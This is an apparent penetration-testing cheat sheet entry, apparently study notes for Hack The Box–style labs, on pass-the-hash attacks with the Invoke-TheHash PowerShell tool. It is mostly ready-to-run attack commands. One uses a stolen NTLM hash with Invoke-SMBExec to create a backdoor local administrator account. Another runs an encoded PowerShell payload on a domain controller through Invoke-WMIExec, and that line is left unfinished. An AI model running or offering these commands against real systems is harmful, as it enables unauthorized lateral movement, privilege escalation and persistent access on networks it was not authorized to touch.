# Pass the Hash: Invoke-TheHash

OS: Active_Directory, Windows
Description: Pass the Hash: Invoke-TheHash
Security Domains: Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21), Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### Invoke-TheHash (PowerShell)

```jsx
https://github.com/Kevin-Robertson/Invoke-TheHash
```

```jsx
Invoke-SMBExec -Target 172.16.1.10 -Domain TargetDomain.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

### Invoke-TheHash (base64 shell)

```jsx
Invoke-WMIExec -Target DC01 -Domain TargetDomain.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e BASE64
```